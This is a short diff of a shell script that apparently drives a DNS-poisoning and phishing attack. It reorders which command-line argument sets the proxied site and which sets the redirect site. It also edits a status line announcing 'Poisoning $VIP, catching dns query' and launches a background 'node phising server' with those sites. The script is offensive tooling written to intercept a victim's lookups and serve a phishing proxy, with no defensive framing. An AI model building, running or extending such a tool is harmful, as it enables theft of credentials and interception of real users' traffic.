@@ -10,22 +10,21 @@ if [ -z "$2" ]
 fi
 SSITE=$2
 
-
 if [ -z "$3" ]
 then
-  RSITE="https://www.google.com/"
+  NSITE=$SSITE
 else
-  RSITE=$3
+  NSITE=$3
 fi
 
 if [ -z "$4" ]
 then
-  NSITE=$SSITE
+  RSITE="https://www.google.com/"
 else
-  NSITE=$4
+  RSITE=$4
 fi
 
-echo "Poisoning $VIP, catching dns query $NSITE, proxying $SSITE, redirecting to $RSITE"
+echo "Poisoning $VIP, catching dns query $SSITE, proxying $NSITE, redirecting to $RSITE"
 
 # Start node phising server
 nohup node node/node.js "$NSITE" "$RSITE" &
